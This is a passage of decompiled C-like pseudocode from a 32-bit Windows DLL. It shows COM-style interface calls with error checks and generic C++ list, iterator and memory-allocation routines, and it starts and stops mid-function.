  LOBYTE(v21) = 0;
  if ( v19 )
    (*(void (__stdcall **)(int *))(*v19 + 8))(v19);
  return a2;
}
// 10045DDD: conditional instruction was optimized away because %var_24.4!=0
// 10045DA6: variable 'v4' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10045ED2) --------------------------------------------------------
int __usercall sub_10045ED2@<eax>(int *a1@<esi>)
{
  int v1; // eax
  int v2; // eax
  int v4; // [esp+0h] [ebp-4h] BYREF

  v1 = *a1;
  v4 = 0;
  v2 = (*(int (__stdcall **)(int *, int *))(v1 + 36))(a1, &v4);
  if ( v2 < 0 )
    sub_1004AED0(v2, (int)a1, (int)&unk_10095CE0);
  return v4;
}

//----- (10045EF9) --------------------------------------------------------
_DWORD *__userpurge sub_10045EF9@<eax>(int *a1@<edx>, int *a2@<ebx>, _DWORD *a3, _DWORD *a4)
{
  int v4; // eax
  int v5; // eax
  _DWORD *result; // eax
  int v7; // [esp-14h] [ebp-30h]
  int v8; // [esp-10h] [ebp-2Ch]
  int v9; // [esp+Ch] [ebp-10h] BYREF

  v7 = *a1;
  v8 = a1[1];
  v4 = *a2;
  v9 = 0;
  v5 = (*(int (__stdcall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, int, int, int, int, int *))(v4 + 44))(
         a2,
         *a4,
         a4[1],
         a4[2],
         a4[3],
         v7,
         v8,
         a1[2],
         a1[3],
         &v9);
  if ( v5 < 0 )
    sub_1004AED0(v5, (int)a2, (int)&unk_10095CE0);
  result = a3;
  *a3 = v9;
  return result;
}

//----- (10045F63) --------------------------------------------------------
_DWORD *__userpurge sub_10045F63@<eax>(_DWORD *a1@<edx>, int *a2@<ebx>, _DWORD *a3)
{
  int v3; // eax
  int v4; // eax
  _DWORD *result; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF

  v3 = *a2;
  v6 = 0;
  v4 = (*(int (__stdcall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, int *))(v3 + 48))(a2, *a1, a1[1], a1[2], a1[3], &v6);
  if ( v4 < 0 )
    sub_1004AED0(v4, (int)a2, (int)&unk_10095CE0);
  result = a3;
  *a3 = v6;
  return result;
}

//----- (10045FC1) --------------------------------------------------------
_DWORD *__userpurge sub_10045FC1@<eax>(int *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v2 = *a1;
  v5 = 0;
  v3 = (*(int (__stdcall **)(int *, int *))(v2 + 32))(a1, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)a1, (int)&unk_10095CD0);
  *a2 = v5;
  return a2;
}

//----- (10046065) --------------------------------------------------------
_DWORD *__usercall sub_10046065@<eax>(int *a1@<eax>, _DWORD *a2@<esi>)
{
  int v2; // eax

  v2 = *a1;
  *a2 = v2;
  if ( v2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v2 + 4))(v2);
  return a2;
}

//----- (10046083) --------------------------------------------------------
int __usercall sub_10046083@<eax>(int a1@<esi>)
{
  if ( !*(_DWORD *)a1 )
    sub_1004AEC0(-2147467261);
  return *(_DWORD *)a1;
}

//----- (100460F2) --------------------------------------------------------
int __usercall sub_100460F2@<eax>(int a1@<esi>)
{
  if ( !*(_DWORD *)a1 )
    sub_1004AEC0(-2147467261);
  return *(_DWORD *)a1;
}

//----- (1004615E) --------------------------------------------------------
_DWORD *__thiscall sub_1004615E(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1004688B(this, v3, 0);
  else
    v4 = 0;
  sub_100474C4(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100461BB) --------------------------------------------------------
_DWORD *__thiscall sub_100461BB(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100469FB(this, v3, 0);
  else
    v4 = 0;
  sub_1004755B(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10046218) --------------------------------------------------------
_DWORD *__thiscall sub_10046218(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1004688B(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100474C4(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004627D) --------------------------------------------------------
_DWORD *__thiscall sub_1004627D(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100469FB(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1004755B(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100462E2) --------------------------------------------------------
_DWORD *__thiscall sub_100462E2(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1004688B(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100474C4(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10046361) --------------------------------------------------------
_DWORD *__thiscall sub_10046361(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100469FB(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1004755B(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100463E0) --------------------------------------------------------
void *__thiscall sub_100463E0(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074717;
  *this = &off_10095C18;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095C18: using guessed type int (__thiscall *off_10095C18)(void *Block, char);

//----- (1004640A) --------------------------------------------------------
int *__thiscall sub_1004640A(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100467F3(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10046462: variable 'v5' is possibly undefined

//----- (1004647D) --------------------------------------------------------
int *__thiscall sub_1004647D(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10046833(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100464D5: variable 'v5' is possibly undefined

//----- (100464F0) --------------------------------------------------------
void __thiscall sub_100464F0(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10047508(v2);
}

//----- (1004652E) --------------------------------------------------------
void __thiscall sub_1004652E(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10047508(v3);
}

//----- (1004656F) --------------------------------------------------------
void __thiscall sub_1004656F(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10047508(v2);
}

//----- (100465AD) --------------------------------------------------------
int __thiscall sub_100465AD(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1004759F(v4);
  return v2;
}

//----- (100465F1) --------------------------------------------------------
int __thiscall sub_100465F1(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10047508(v4);
  return v2;
}

//----- (10046635) --------------------------------------------------------
void __thiscall sub_10046635(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10047508(v1);
}

//----- (10046709) --------------------------------------------------------
_DWORD *__thiscall sub_10046709(_DWORD *Block, char a2)
{
  sub_100463E0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100467F3) --------------------------------------------------------
int __usercall sub_100467F3@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10046833) --------------------------------------------------------
int __usercall sub_10046833@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1004688B) --------------------------------------------------------
_DWORD *__thiscall sub_1004688B(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095C50;
  a2[1] = this;
  *a2 = &off_10095C90;
  a2[2] = a3;
  return result;
}
// 10095C50: using guessed type int (__thiscall *off_10095C50)(void *Block, char);
// 10095C90: using guessed type int (__thiscall *off_10095C90)(void *Block, char);

//----- (100468C3) --------------------------------------------------------
void *__thiscall sub_100468C3(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074687;
  *this = &off_10095C90;
  *this = &off_10095C50;
  return result;
}
// 10095C50: using guessed type int (__thiscall *off_10095C50)(void *Block, char);
// 10095C90: using guessed type int (__thiscall *off_10095C90)(void *Block, char);

//----- (100468ED) --------------------------------------------------------
bool __thiscall sub_100468ED(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10046904) --------------------------------------------------------
BOOL __thiscall sub_10046904(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1004690E) --------------------------------------------------------
int __thiscall sub_1004690E(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10046949) --------------------------------------------------------
int __thiscall sub_10046949(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1004697F) --------------------------------------------------------
int __thiscall sub_1004697F(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (100469A7) --------------------------------------------------------
int __thiscall sub_100469A7(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100469E2) --------------------------------------------------------
int __thiscall sub_100469E2(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100469FB) --------------------------------------------------------
_DWORD *__thiscall sub_100469FB(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095C70;
  a2[1] = this;
  *a2 = &off_10095CB0;
  a2[2] = a3;
  return result;
}
// 10095C70: using guessed type int (__thiscall *off_10095C70)(void *Block, char);
// 10095CB0: using guessed type int (__thiscall *off_10095CB0)(void *Block, char);

//----- (10046A33) --------------------------------------------------------
void *__thiscall sub_10046A33(_DWORD *this)
{
  void *result; // eax

  result = &loc_10074663;
  *this = &off_10095CB0;
  *this = &off_10095C70;
  return result;
}
// 10095C70: using guessed type int (__thiscall *off_10095C70)(void *Block, char);
// 10095CB0: using guessed type int (__thiscall *off_10095CB0)(void *Block, char);

//----- (10046A5D) --------------------------------------------------------
bool __thiscall sub_10046A5D(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10046A74) --------------------------------------------------------
BOOL __thiscall sub_10046A74(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10046A7E) --------------------------------------------------------
int __thiscall sub_10046A7E(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10046AB9) --------------------------------------------------------
int __thiscall sub_10046AB9(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10046AEF) --------------------------------------------------------
int __thiscall sub_10046AEF(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10046B17) --------------------------------------------------------
int __thiscall sub_10046B17(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10046B52) --------------------------------------------------------
int __thiscall sub_10046B52(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10046B6B) --------------------------------------------------------
_DWORD *__thiscall sub_10046B6B(_DWORD *Block, char a2)
{
  sub_100468C3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10046B87) --------------------------------------------------------
_DWORD *__thiscall sub_10046B87(_DWORD *Block, char a2)
{
  sub_10046A33(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10046BD8) --------------------------------------------------------
_DWORD *__userpurge sub_10046BD8@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10046C1F) --------------------------------------------------------
_DWORD *__stdcall sub_10046C1F(_DWORD *a1)
{
  sub_10047668(a1);
  *a1 = &off_10095B58;
  sub_1004775C(a1);
  return a1;
}
// 10095B58: using guessed type int (__thiscall *off_10095B58)(void *Block, char);

//----- (10046C57) --------------------------------------------------------
int *__thiscall sub_10046C57(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10044A78(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10046C99) --------------------------------------------------------
void *__thiscall sub_10046C99(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_10095B58;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10044A78(v2);
  this[3] = 0;
  v5 = -1;
  return sub_100463E0(this);
}
// 10095B58: using guessed type int (__thiscall *off_10095B58)(void *Block, char);

//----- (10046CFA) --------------------------------------------------------
int __thiscall sub_10046CFA(_DWORD *this)
{
  return this[1];
}

//----- (10046CFE) --------------------------------------------------------
_DWORD *__thiscall sub_10046CFE(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B643F);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_10047737((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_10047737((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (10046D64) --------------------------------------------------------
int __thiscall sub_10046D64(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10046D7C) --------------------------------------------------------
int __thiscall sub_10046D7C(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6480);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_10047737((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10047737((_DWORD *)(this[3] + 8 * v4), dword_100BFAB0);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BFAB0: using guessed type _DWORD dword_100BFAB0[2];

//----- (10046DD3) --------------------------------------------------------
int __thiscall sub_10046DD3(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6481);
  return this[3] + 8 * a2;
}

//----- (10046DF1) --------------------------------------------------------
int __thiscall sub_10046DF1(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6482);
  return this[3] + 8 * a2;
}

//----- (10046E0F) --------------------------------------------------------
char *__thiscall sub_10046E0F(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10044A78(v3);
  }
  return result;
}

//----- (10046E35) --------------------------------------------------------
int __thiscall sub_10046E35(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10044A78(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10046E5C) --------------------------------------------------------
BOOL __thiscall sub_10046E5C(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10046E67) --------------------------------------------------------
int __thiscall sub_10046E67(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_10047737((_DWORD *)(this[3] + 8 * i), dword_100BFAB0);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BFAB0: using guessed type _DWORD dword_100BFAB0[2];

//----- (10046EB1) --------------------------------------------------------
unsigned int __thiscall sub_10046EB1(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6483);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10046F23) --------------------------------------------------------
unsigned int __thiscall sub_10046F23(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10046F4B) --------------------------------------------------------
unsigned int __stdcall sub_10046F4B(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10046F5C) --------------------------------------------------------
unsigned int __thiscall sub_10046F5C(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_100475FA, sub_100448D2);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_10047737((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1004700C) --------------------------------------------------------
void *__thiscall sub_1004700C(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
